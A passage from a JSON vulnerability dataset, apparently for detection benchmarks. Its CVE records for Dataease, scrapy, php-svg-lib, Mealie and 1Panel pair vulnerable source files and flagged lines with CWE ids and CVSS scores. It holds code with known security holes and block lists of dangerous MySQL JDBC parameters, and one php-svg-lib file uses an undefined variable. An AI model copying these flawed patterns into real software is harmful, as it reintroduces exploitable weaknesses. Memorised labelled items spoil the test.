\"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }\n\n    public List<String> getIllegalParameters(){\n        List<String> newIllegalParameters = new ArrayList<>();\n        newIllegalParameters.addAll(illegalParameters);\n        newIllegalParameters.addAll(Arrays.asList(\"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\"));\n        return newIllegalParameters;\n    }\n\n}"
        }
      ],
      "method_level": [
        "public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : getIllegalParameters()) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    throw new RuntimeException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE?EXTRA_PARAMS\".replace(\"HOSTNAME\", getHost().trim()).replace(\"PORT\", getPort().toString().trim()).replace(\"DATABASE\", getDataBase().trim()).replace(\"EXTRA_PARAMS\", getExtraParams().trim());\n        }\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 25,
          "content": "                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {"
        }
      ]
    },
    "cwe": [
      "CWE-502"
    ],
    "severity": "CRITICAL",
    "cvss_score": 9.1,
    "cvss_version": 3.1
  },
  {
    "id": 671,
    "cve": "CVE-2024-3574",
    "description": "In scrapy version 2.10.1, an issue was identified where the Authorization header, containing credentials for server authentication, is leaked to a third-party site during a cross-domain redirect. This vulnerability arises from the failure to remove the Authorization header when redirecting across domains. The exposure of the Authorization header to unauthorized actors could potentially allow for account hijacking.",
    "vulnerability": {
      "file_level": [
        {
          "name": "scrapy/downloadermiddlewares/redirect.py",
          "content": "import logging\nfrom urllib.parse import urljoin, urlparse\n\nfrom w3lib.url import safe_url_string\n\nfrom scrapy.exceptions import IgnoreRequest, NotConfigured\nfrom scrapy.http import HtmlResponse\nfrom scrapy.utils.httpobj import urlparse_cached\nfrom scrapy.utils.response import get_meta_refresh\n\nlogger = logging.getLogger(__name__)\n\n\ndef _build_redirect_request(source_request, *, url, **kwargs):\n    redirect_request = source_request.replace(\n        url=url,\n        **kwargs,\n        cookies=None,\n    )\n    if \"Cookie\" in redirect_request.headers:\n        source_request_netloc = urlparse_cached(source_request).netloc\n        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n        if source_request_netloc != redirect_request_netloc:\n            del redirect_request.headers[\"Cookie\"]\n    return redirect_request\n\n\nclass BaseRedirectMiddleware:\n    enabled_setting = \"REDIRECT_ENABLED\"\n\n    def __init__(self, settings):\n        if not settings.getbool(self.enabled_setting):\n            raise NotConfigured\n\n        self.max_redirect_times = settings.getint(\"REDIRECT_MAX_TIMES\")\n        self.priority_adjust = settings.getint(\"REDIRECT_PRIORITY_ADJUST\")\n\n    @classmethod\n    def from_crawler(cls, crawler):\n        return cls(crawler.settings)\n\n    def _redirect(self, redirected, request, spider, reason):\n        ttl = request.meta.setdefault(\"redirect_ttl\", self.max_redirect_times)\n        redirects = request.meta.get(\"redirect_times\", 0) + 1\n\n        if ttl and redirects <= self.max_redirect_times:\n            redirected.meta[\"redirect_times\"] = redirects\n            redirected.meta[\"redirect_ttl\"] = ttl - 1\n            redirected.meta[\"redirect_urls\"] = request.meta.get(\"redirect_urls\", []) + [\n                request.url\n            ]\n            redirected.meta[\"redirect_reasons\"] = request.meta.get(\n                \"redirect_reasons\", []\n            ) + [reason]\n            redirected.dont_filter = request.dont_filter\n            redirected.priority = request.priority + self.priority_adjust\n            logger.debug(\n                \"Redirecting (%(reason)s) to %(redirected)s from %(request)s\",\n                {\"reason\": reason, \"redirected\": redirected, \"request\": request},\n                extra={\"spider\": spider},\n            )\n            return redirected\n        logger.debug(\n            \"Discarding %(request)s: max redirections reached\",\n            {\"request\": request},\n            extra={\"spider\": spider},\n        )\n        raise IgnoreRequest(\"max redirections reached\")\n\n    def _redirect_request_using_get(self, request, redirect_url):\n        redirect_request = _build_redirect_request(\n            request,\n            url=redirect_url,\n            method=\"GET\",\n            body=\"\",\n        )\n        redirect_request.headers.pop(\"Content-Type\", None)\n        redirect_request.headers.pop(\"Content-Length\", None)\n        return redirect_request\n\n\nclass RedirectMiddleware(BaseRedirectMiddleware):\n    \"\"\"\n    Handle redirection of requests based on response status\n    and meta-refresh html tag.\n    \"\"\"\n\n    def process_response(self, request, response, spider):\n        if (\n            request.meta.get(\"dont_redirect\", False)\n            or response.status in getattr(spider, \"handle_httpstatus_list\", [])\n            or response.status in request.meta.get(\"handle_httpstatus_list\", [])\n            or request.meta.get(\"handle_httpstatus_all\", False)\n        ):\n            return response\n\n        allowed_status = (301, 302, 303, 307, 308)\n        if \"Location\" not in response.headers or response.status not in allowed_status:\n            return response\n\n        location = safe_url_string(response.headers[\"Location\"])\n        if response.headers[\"Location\"].startswith(b\"//\"):\n            request_scheme = urlparse(request.url).scheme\n            location = request_scheme + \"://\" + location.lstrip(\"/\")\n\n        redirected_url = urljoin(request.url, location)\n\n        if response.status in (301, 307, 308) or request.method == \"HEAD\":\n            redirected = _build_redirect_request(request, url=redirected_url)\n            return self._redirect(redirected, request, spider, response.status)\n\n        redirected = self._redirect_request_using_get(request, redirected_url)\n        return self._redirect(redirected, request, spider, response.status)\n\n\nclass MetaRefreshMiddleware(BaseRedirectMiddleware):\n    enabled_setting = \"METAREFRESH_ENABLED\"\n\n    def __init__(self, settings):\n        super().__init__(settings)\n        self._ignore_tags = settings.getlist(\"METAREFRESH_IGNORE_TAGS\")\n        self._maxdelay = settings.getint(\"METAREFRESH_MAXDELAY\")\n\n    def process_response(self, request, response, spider):\n        if (\n            request.meta.get(\"dont_redirect\", False)\n            or request.method == \"HEAD\"\n            or not isinstance(response, HtmlResponse)\n        ):\n            return response\n\n        interval, url = get_meta_refresh(response, ignore_tags=self._ignore_tags)\n        if url and interval < self._maxdelay:\n            redirected = self._redirect_request_using_get(request, url)\n            return self._redirect(redirected, request, spider, \"meta refresh\")\n\n        return response\n"
        }
      ],
      "method_level": [
        "def _build_redirect_request(source_request, *, url, **kwargs):\n    redirect_request = source_request.replace(\n        url=url,\n        **kwargs,\n        cookies=None,\n    )\n    if \"Cookie\" in redirect_request.headers:\n        source_request_netloc = urlparse_cached(source_request).netloc\n        redirect_request_netloc = urlparse_cached(redirect_request).netloc\n        if source_request_netloc != redirect_request_netloc:\n            del redirect_request.headers[\"Cookie\"]\n    return redirect_request"
      ],
      "hunk_level": [
        {
          "line_no": 20,
          "content": "    if \"Cookie\" in redirect_request.headers:"
        },
        {
          "line_no": 24,
          "content": "            del redirect_request.headers[\"Cookie\"]"
        }
      ]
    },
    "cwe": [
      "CWE-200"
    ],
    "severity": "HIGH",
    "cvss_score": 7.5,
    "cvss_version": 3.0
  },
  {
    "id": 315,
    "cve": "CVE-2024-25117",
    "description": "php-svg-lib is a scalable vector graphics (SVG) file parsing/rendering library. Prior to version 0.5.2, php-svg-lib fails to validate that font-family doesn't contain a PHAR url, which might leads to RCE on PHP < 8.0, and doesn't validate if external references are allowed. This might leads to bypass of restrictions or RCE on projects that are using it, if they do not strictly revalidate the fontName that is passed by php-svg-lib. The `Style::fromAttributes(`), or the `Style::parseCssStyle()` should check the content of the `font-family` and prevents it to use a PHAR url, to avoid passing an invalid and dangerous `fontName` value to other libraries. The same check as done in the `Style::fromStyleSheets` might be reused. Libraries using this library as a dependency might be vulnerable to some bypass of restrictions, or even remote code execution, if they do not double check the value of the `fontName` that is passed by php-svg-lib. Version 0.5.2 contains a fix for this issue.",
    "vulnerability": {
      "file_level": [
        {
          "name": "src/Svg/Tag/Image.php",
          "content": "<?php\n/**\n * @package php-svg-lib\n * @link    http://github.com/PhenX/php-svg-lib\n * @author  Fabien Ménager <fabien.menager@gmail.com>\n * @license GNU LGPLv3+ http://www.gnu.org/copyleft/lesser.html\n */\n\nnamespace Svg\\Tag;\n\nuse Svg\\Style;\n\nclass Image extends AbstractTag\n{\n    protected $x = 0;\n    protected $y = 0;\n    protected $width = 0;\n    protected $height = 0;\n    protected $href = null;\n\n    protected function before($attributes)\n    {\n        parent::before($attributes);\n\n        $surface = $this->document->getSurface();\n        $surface->save();\n\n        $this->applyTransform($attributes);\n    }\n\n    public function start($attributes)\n    {\n        $height = $this->document->getHeight();\n        $width = $this->document->getWidth();\n        $this->y = $height;\n\n        if (isset($attributes['x'])) {\n            $this->x = $this->convertSize($attributes['x'], $width);\n        }\n        if (isset($attributes['y'])) {\n            $this->y = $height - $this->convertSize($attributes['y'], $height);\n        }\n\n        if (isset($attributes['width'])) {\n            $this->width = $this->convertSize($attributes['width'], $width);\n        }\n        if (isset($attributes['height'])) {\n            $this->height = $this->convertSize($attributes['height'], $height);\n        }\n\n        if (isset($attributes['xlink:href'])) {\n            $this->href = $attributes['xlink:href'];\n        }\n\n        if (isset($attributes['href'])) {\n            $this->href = $attributes['href'];\n        }\n\n        $this->document->getSurface()->transform(1, 0, 0, -1, 0, $height);\n\n        if ($from === \"font-family\") {\n            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");\n            if (\n                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\"\n                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")\n            ) {\n                return;\n            }\n        }\n\n        $this->document->getSurface()->drawImage($this->href, $this->x, $this->y, $this->width, $this->height);\n    }\n\n    protected function after()\n    {\n        $this->document->getSurface()->restore();\n    }\n} \n"
        }
      ],
      "method_level": [
        "public function start($attributes)\n    {\n        $height = $this->document->getHeight();\n        $width = $this->document->getWidth();\n        $this->y = $height;\n\n        if (isset($attributes['x'])) {\n            $this->x = $this->convertSize($attributes['x'], $width);\n        }\n        if (isset($attributes['y'])) {\n            $this->y = $height - $this->convertSize($attributes['y'], $height);\n        }\n\n        if (isset($attributes['width'])) {\n            $this->width = $this->convertSize($attributes['width'], $width);\n        }\n        if (isset($attributes['height'])) {\n            $this->height = $this->convertSize($attributes['height'], $height);\n        }\n\n        if (isset($attributes['xlink:href'])) {\n            $this->href = $attributes['xlink:href'];\n        }\n\n        if (isset($attributes['href'])) {\n            $this->href = $attributes['href'];\n        }\n\n        $this->document->getSurface()->transform(1, 0, 0, -1, 0, $height);\n\n        if ($from === \"font-family\") {\n            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");\n            if (\n                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\"\n                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")\n            ) {\n                return;\n            }\n        }\n\n        $this->document->getSurface()->drawImage($this->href, $this->x, $this->y, $this->width, $this->height);\n    }"
      ],
      "hunk_level": [
        {
          "line_no": 61,
          "content": "        if ($from === \"font-family\") {"
        },
        {
          "line_no": 62,
          "content": "            $scheme = \\strtolower(parse_url($this->href, PHP_URL_SCHEME) ?: \"\");"
        },
        {
          "line_no": 63,
          "content": "            if ("
        },
        {
          "line_no": 64,
          "content": "                $scheme === \"phar\" || \\strtolower(\\substr($this->href, 0, 7)) === \"phar://\""
        },
        {
          "line_no": 65,
          "content": "                || ($this->document->allowExternalReferences === false && $scheme !== \"data\")"
        },
        {
          "line_no": 66,
          "content": "            ) {"
        },
        {
          "line_no": 67,
          "content": "                return;"
        },
        {
          "line_no": 68,
          "content": "            }"
        }
      ]
    },
    "cwe": [
      "CWE-502",
      "CWE-610",
      "CWE-73"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.8,
    "cvss_version": 3.1
  },
  {
    "id": 697,
    "cve": "CVE-2024-31994",
    "description": "Mealie is a self hosted recipe manager and meal planner. Prior to 1.4.0, an attacker can point the image request to an arbitrarily large file. Mealie will attempt to retrieve this file in whole. If it can be retrieved, it may be stored on the file system in whole (leading to possible disk consumption), however the more likely scenario given resource limitations is that the container will OOM during file retrieval if the target file size is greater than the allocated memory of the container. At best this can be used to force the container to infinitely restart due to OOM (if so configured in `docker-compose.yml), or at worst this can be used to force the Mealie container to crash and remain offline. In the event that the file can be retrieved, the lack of rate limiting on this endpoint also permits an attacker to generate ongoing requests to any target of their choice, potentially contributing to an external-facing DoS attack. This vulnerability is fixed in 1.4.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "mealie/services/recipe/recipe_data_service.py",
          "content": "import asyncio\nimport shutil\nfrom pathlib import Path\n\nfrom httpx import AsyncClient, Response\nfrom pydantic import UUID4\n\nfrom mealie.pkgs import img\nfrom mealie.schema.recipe.recipe import Recipe\nfrom mealie.services._base_service import BaseService\n\n_FIREFOX_UA = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0\"\n\n\nasync def gather_with_concurrency(n, *coros, ignore_exceptions=False):\n    semaphore = asyncio.Semaphore(n)\n\n    async def sem_coro(coro):\n        async with semaphore:\n            return await coro\n\n    results = await asyncio.gather(*(sem_coro(c) for c in coros), return_exceptions=ignore_exceptions)\n    if ignore_exceptions:\n        results = [r for r in results if not isinstance(r, Exception)]\n    return results\n\n\nasync def largest_content_len(urls: list[str]) -> tuple[str, int]:\n    largest_url = \"\"\n    largest_len = 0\n\n    async def do(client: AsyncClient, url: str) -> Response:\n        return await client.head(url, headers={\"User-Agent\": _FIREFOX_UA})\n\n    async with AsyncClient() as client:\n        tasks = [do(client, url) for url in urls]\n        responses: list[Response] = await gather_with_concurrency(10, *tasks, ignore_exceptions=True)\n        for response in responses:\n            len_int = int(response.headers.get(\"Content-Length\", 0))\n            if len_int > largest_len:\n                largest_url = str(response.url)\n                largest_len = len_int\n\n    return largest_url, largest_len\n\n\nclass NotAnImageError(Exception):\n    pass\n\n\nclass InvalidDomainError(Exception):\n    pass\n\n\nclass RecipeDataService(BaseService):\n    minifier: img.ABCMinifier\n\n    def __init__(self, recipe_id: UUID4, group_id: UUID4 | None = None) -> None:\n        \"\"\"\n        RecipeDataService is a service that consolidates the reading/writing actions related\n        to assets, and images for a recipe.\n        \"\"\"\n        super().__init__()\n\n        self.recipe_id = recipe_id\n        self.slug = group_id\n        self.minifier = img.PillowMinifier(purge=True, logger=self.logger)\n\n        self.dir_data = Recipe.directory_from_id(self.recipe_id)\n        self.dir_image = self.dir_data.joinpath(\"images\")\n        self.dir_image_timeline = self.dir_image.joinpath(\"timeline\")\n        self.dir_assets = self.dir_data.joinpath(\"assets\")\n\n        for dir in [self.dir_image, self.dir_image_timeline, self.dir_assets]:\n            dir.mkdir(parents=True, exist_ok=True)\n\n    def delete_all_data(self) -> None:\n        try:\n            shutil.rmtree(self.dir_data)\n        except Exception as e:\n            self.logger.exception(f\"Failed to delete recipe data: {e}\")\n\n    def write_image(self, file_data: bytes | Path, extension: str, image_dir: Path | None = None) -> Path:\n        if not image_dir:\n            image_dir = self.dir_image\n\n        extension = extension.replace(\".\", \"\")\n        image_path = image_dir.joinpath(f\"original.{extension}\")\n        image_path.unlink(missing_ok=True)\n\n        if isinstance(file_data, Path):\n            shutil.copy2(file_data, image_path)\n        elif isinstance(file_data, bytes):\n            with open(image_path, \"ab\") as f:\n                f.write(file_data)\n        else:\n            with open(image_path, \"ab\") as f:\n                shutil.copyfileobj(file_data, f)\n\n        self.minifier.minify(image_path)\n\n        return image_path\n\n    @staticmethod\n    def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True\n\n    async def scrape_image(self, image_url) -> None:\n        self.logger.info(f\"Image URL: {image_url}\")\n\n        if not self._validate_image_url(image_url):\n            self.logger.error(f\"Invalid image URL: {image_url}\")\n            raise InvalidDomainError(f\"Invalid domain: {image_url}\")\n\n        if isinstance(image_url, str):  # Handles String Types\n            pass\n\n        elif isinstance(image_url, list):  # Handles List Types\n            # Multiple images have been defined in the schema - usually different resolutions\n            # Typically would be in smallest->biggest order, but can't be certain so test each.\n            # 'Google will pick the best image to display in Search results based on the aspect ratio and resolution.'\n            image_url, _ = await largest_content_len(image_url)\n\n        elif isinstance(image_url, dict):  # Handles Dictionary Types\n            for key in image_url:\n                if key == \"url\":\n                    image_url = image_url.get(\"url\")\n\n        ext = image_url.split(\".\")[-1]\n\n        if ext not in img.IMAGE_EXTENSIONS:\n            ext = \"jpg\"  # Guess the extension\n\n        file_name = f\"{str(self.recipe_id)}.{ext}\"\n        file_path = Recipe.directory_from_id(self.recipe_id).joinpath(\"images\", file_name)\n\n        async with AsyncClient() as client:\n            try:\n                r = await client.get(image_url, headers={\"User-Agent\": _FIREFOX_UA})\n            except Exception:\n                self.logger.exception(\"Fatal Image Request Exception\")\n                return None\n\n            if r.status_code != 200:\n                # TODO: Probably should throw an exception in this case as well, but before these changes\n                # we were returning None if it failed anyways.\n                return None\n\n            content_type = r.headers.get(\"content-type\", \"\")\n\n            if \"image\" not in content_type:\n                self.logger.error(f\"Content-Type: {content_type} is not an image\")\n                raise NotAnImageError(f\"Content-Type {content_type} is not an image\")\n\n            self.logger.debug(f\"File Name Suffix {file_path.suffix}\")\n            self.write_image(r.read(), file_path.suffix)\n            file_path.unlink(missing_ok=True)\n"
        }
      ],
      "method_level": [
        "def _validate_image_url(url: str) -> bool:\n        # sourcery skip: invert-any-all, use-any\n        \"\"\"\n        Validates that the URL is of an allowed source and restricts certain sources to prevent\n        malicious images from being downloaded.\n        \"\"\"\n        invalid_domains = {\"127.0.0.1\", \"localhost\"}\n        for domain in invalid_domains:\n            if domain in url:\n                return False\n\n        return True"
      ],
      "hunk_level": [
        {
          "line_no": 105,
          "content": "    def _validate_image_url(url: str) -> bool:"
        },
        {
          "line_no": 106,
          "content": "        # sourcery skip: invert-any-all, use-any"
        },
        {
          "line_no": 107,
          "content": "        \"\"\""
        },
        {
          "line_no": 108,
          "content": "        Validates that the URL is of an allowed source and restricts certain sources to prevent"
        },
        {
          "line_no": 109,
          "content": "        malicious images from being downloaded."
        },
        {
          "line_no": 110,
          "content": "        \"\"\""
        },
        {
          "line_no": 111,
          "content": "        invalid_domains = {\"127.0.0.1\", \"localhost\"}"
        },
        {
          "line_no": 112,
          "content": "        for domain in invalid_domains:"
        },
        {
          "line_no": 113,
          "content": "            if domain in url:"
        },
        {
          "line_no": 114,
          "content": "                return False"
        },
        {
          "line_no": 116,
          "content": "        return True"
        }
      ]
    },
    "cwe": [
      "CWE-770",
      "CWE-400"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 226,
    "cve": "CVE-2024-24768",
    "description": "1Panel is an open source Linux server operation and maintenance management panel. The HTTPS cookie that comes with the panel does not have the Secure keyword, which may cause the cookie to be sent in plain text if accessed using HTTP. This issue has been patched in version 1.9.6.\n\n",
    "vulnerability": {
      "file_level": [
        {
          "name": "backend/app/service/auth.go",
          "content": "package service\n\nimport (\n\t\"strconv\"\n\n\t\"github.com/1Panel-dev/1Panel/backend/app/dto\"\n\t\"github.com/1Panel-dev/1Panel/backend/buserr\"\n\t\"github.com/1Panel-dev/1Panel/backend/constant\"\n\t\"github.com/1Panel-dev/1Panel/backend/global\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/encrypt\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/jwt\"\n\t\"github.com/1Panel-dev/1Panel/backend/utils/mfa\"\n\t\"github.com/gin-gonic/gin\"\n\t\"github.com/google/uuid\"\n\t\"github.com/pkg/errors\"\n)\n\ntype AuthService struct{}\n\ntype IAuthService interface {\n\tCheckIsSafety(code string) (string, error)\n\tVerifyCode(code string) (bool, error)\n\tLogin(c *gin.Context, info dto.Login, entrance string) (*dto.UserLoginInfo, error)\n\tLogOut(c *gin.Context) error\n\tMFALogin(c *gin.Context, info dto.MFALogin, entrance string) (*dto.UserLoginInfo, error)\n}\n\nfunc NewIAuthService() IAuthService {\n\treturn &AuthService{}\n}\n\nfunc (u *AuthService) Login(c *gin.Context, info dto.Login, entrance string) (*dto.UserLoginInfo, error) {\n\tnameSetting, err := settingRepo.Get(settingRepo.WithByKey(\"UserName\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpasswordSetting, err := settingRepo.Get(settingRepo.WithByKey(\"Password\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpass, err := encrypt.StringDecrypt(passwordSetting.Value)\n\tif err != nil {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tif info.Password != pass || nameSetting.Value != info.Name {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tentranceSetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif len(entranceSetting.Value) != 0 && entranceSetting.Value != entrance {\n\t\treturn nil, buserr.New(constant.ErrEntrance)\n\t}\n\tmfa, err := settingRepo.Get(settingRepo.WithByKey(\"MFAStatus\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif err = settingRepo.Update(\"Language\", info.Language); err != nil {\n\t\treturn nil, err\n\t}\n\tif mfa.Value == \"enable\" {\n\t\treturn &dto.UserLoginInfo{Name: nameSetting.Value, MfaStatus: mfa.Value}, nil\n\t}\n\treturn u.generateSession(c, info.Name, info.AuthMethod)\n}\n\nfunc (u *AuthService) MFALogin(c *gin.Context, info dto.MFALogin, entrance string) (*dto.UserLoginInfo, error) {\n\tnameSetting, err := settingRepo.Get(settingRepo.WithByKey(\"UserName\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpasswordSetting, err := settingRepo.Get(settingRepo.WithByKey(\"Password\"))\n\tif err != nil {\n\t\treturn nil, errors.WithMessage(constant.ErrRecordNotFound, err.Error())\n\t}\n\tpass, err := encrypt.StringDecrypt(passwordSetting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif info.Password != pass || nameSetting.Value != info.Name {\n\t\treturn nil, constant.ErrAuth\n\t}\n\tentranceSetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tif len(entranceSetting.Value) != 0 && entranceSetting.Value != entrance {\n\t\treturn nil, buserr.New(constant.ErrEntrance)\n\t}\n\tmfaSecret, err := settingRepo.Get(settingRepo.WithByKey(\"MFASecret\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tmfaInterval, err := settingRepo.Get(settingRepo.WithByKey(\"MFAInterval\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tsuccess := mfa.ValidCode(info.Code, mfaInterval.Value, mfaSecret.Value)\n\tif !success {\n\t\treturn nil, constant.ErrAuth\n\t}\n\n\treturn u.generateSession(c, info.Name, info.AuthMethod)\n}\n\nfunc (u *AuthService) generateSession(c *gin.Context, name, authMethod string) (*dto.UserLoginInfo, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SessionTimeout\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tlifeTime, err := strconv.Atoi(setting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tif authMethod == constant.AuthMethodJWT {\n\t\tj := jwt.NewJWT()\n\t\tclaims := j.CreateClaims(jwt.BaseClaims{\n\t\t\tName: name,\n\t\t})\n\t\ttoken, err := j.CreateToken(claims)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name, Token: token}, nil\n\t}\n\tsID, _ := c.Cookie(constant.SessionName)\n\tsessionUser, err := global.SESSION.Get(sID)\n\tif err != nil {\n\t\tsID = uuid.New().String()\n\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)\n\t\terr := global.SESSION.Set(sID, sessionUser, lifeTime)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name}, nil\n\t}\n\tif err := global.SESSION.Set(sID, sessionUser, lifeTime); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &dto.UserLoginInfo{Name: name}, nil\n}\n\nfunc (u *AuthService) LogOut(c *gin.Context) error {\n\tsID, _ := c.Cookie(constant.SessionName)\n\tif sID != \"\" {\n\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)\n\t\terr := global.SESSION.Delete(sID)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}\n\nfunc (u *AuthService) VerifyCode(code string) (bool, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn false, err\n\t}\n\treturn setting.Value == code, nil\n}\n\nfunc (u *AuthService) CheckIsSafety(code string) (string, error) {\n\tstatus, err := settingRepo.Get(settingRepo.WithByKey(\"SecurityEntrance\"))\n\tif err != nil {\n\t\treturn \"\", err\n\t}\n\tif len(status.Value) == 0 {\n\t\treturn \"disable\", nil\n\t}\n\tif status.Value == code {\n\t\treturn \"pass\", nil\n\t}\n\treturn \"unpass\", nil\n}\n"
        }
      ],
      "method_level": [
        "func (u *AuthService) generateSession(c *gin.Context, name, authMethod string) (*dto.UserLoginInfo, error) {\n\tsetting, err := settingRepo.Get(settingRepo.WithByKey(\"SessionTimeout\"))\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\tlifeTime, err := strconv.Atoi(setting.Value)\n\tif err != nil {\n\t\treturn nil, err\n\t}\n\n\tif authMethod == constant.AuthMethodJWT {\n\t\tj := jwt.NewJWT()\n\t\tclaims := j.CreateClaims(jwt.BaseClaims{\n\t\t\tName: name,\n\t\t})\n\t\ttoken, err := j.CreateToken(claims)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name, Token: token}, nil\n\t}\n\tsID, _ := c.Cookie(constant.SessionName)\n\tsessionUser, err := global.SESSION.Get(sID)\n\tif err != nil {\n\t\tsID = uuid.New().String()\n\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)\n\t\terr := global.SESSION.Set(sID, sessionUser, lifeTime)\n\t\tif err != nil {\n\t\t\treturn nil, err\n\t\t}\n\t\treturn &dto.UserLoginInfo{Name: name}, nil\n\t}\n\tif err := global.SESSION.Set(sID, sessionUser, lifeTime); err != nil {\n\t\treturn nil, err\n\t}\n\n\treturn &dto.UserLoginInfo{Name: name}, nil\n}",
        "func (u *AuthService) LogOut(c *gin.Context) error {\n\tsID, _ := c.Cookie(constant.SessionName)\n\tif sID != \"\" {\n\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)\n\t\terr := global.SESSION.Delete(sID)\n\t\tif err != nil {\n\t\t\treturn err\n\t\t}\n\t}\n\treturn nil\n}"
      ],
      "hunk_level": [
        {
          "line_no": 132,
          "content": "\t\tc.SetCookie(constant.SessionName, sID, 0, \"\", \"\", false, false)"
        },
        {
          "line_no": 149,
          "content": "\t\tc.SetCookie(constant.SessionName, sID, -1, \"\", \"\", false, false)"
        }
      ]
    },
    "cwe": [
      "CWE-311",
      "CWE-315"
    ],
    "severity": "MEDIUM",
    "cvss_score": 6.5,
    "cvss_version": 3.1
  },
  {
    "id": 401,
    "cve": "CVE-2024-23328",
    "description": "Dataease is an open source data visualization analysis tool. A deserialization vulnerability exists in the DataEase datasource, which can be exploited to execute arbitrary code. The location of the vulnerability code is `core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java.` The blacklist of mysql jdbc attacks can be bypassed and attackers can further exploit it for deserialized execution or reading arbitrary files. This vulnerability is patched in 1.18.15 and 2.3.0.",
    "vulnerability": {
      "file_level": [
        {
          "name": "core/core-backend/src/main/java/io/dataease/datasource/type/Mysql.java",
          "content": "package io.dataease.datasource.type;\n\nimport io.dataease.api.ds.vo.DatasourceConfiguration;\nimport io.dataease.exception.DEException;\nimport lombok.Data;\nimport org.apache.commons.lang3.StringUtils;\nimport org.springframework.stereotype.Component;\n\nimport java.util.Arrays;\nimport java.util.List;\n\n@Data\n@Component(\"mysql\")\npublic class Mysql extends DatasourceConfiguration {\n    private String driver = \"com.mysql.cj.jdbc.Driver\";\n    private String extraParams = \"characterEncoding=UTF-8&connectTimeout=5000&useSSL=false&allowPublicKeyRetrieval=true&zeroDateTimeBehavior=convertToNull\";\n    private List<String> illegalParameters = Arrays.asList(\"autoDeserialize\", \"queryInterceptors\", \"statementInterceptors\", \"detectCustomCollations\", \"allowloadlocalinfile\", \"allowUrlInLocalInfile\", \"allowLoadLocalInfileInPath\");\n    private List<String> showTableSqls = Arrays.asList(\"show tables\");\n\n    public String getJdbc() {\n        if (StringUtils.isEmpty(extraParams.trim())) {\n            return \"jdbc:mysql://HOSTNAME:PORT/DATABASE\"\n                    .replace(\"HOSTNAME\", getHost().trim())\n                    .replace(\"PORT\", getPort().toString().trim())\n                    .replace(\"DATABASE\", getDataBase().trim());\n        } else {\n            for (String illegalParameter : illegalParameters) {\n                if (getExtraParams().toLowerCase().contains(illegalParameter.toLowerCase())) {\n                    DEException.throwException(\"Illegal parameter: \" + illegalParameter);\n                }\n            }\n\n            return 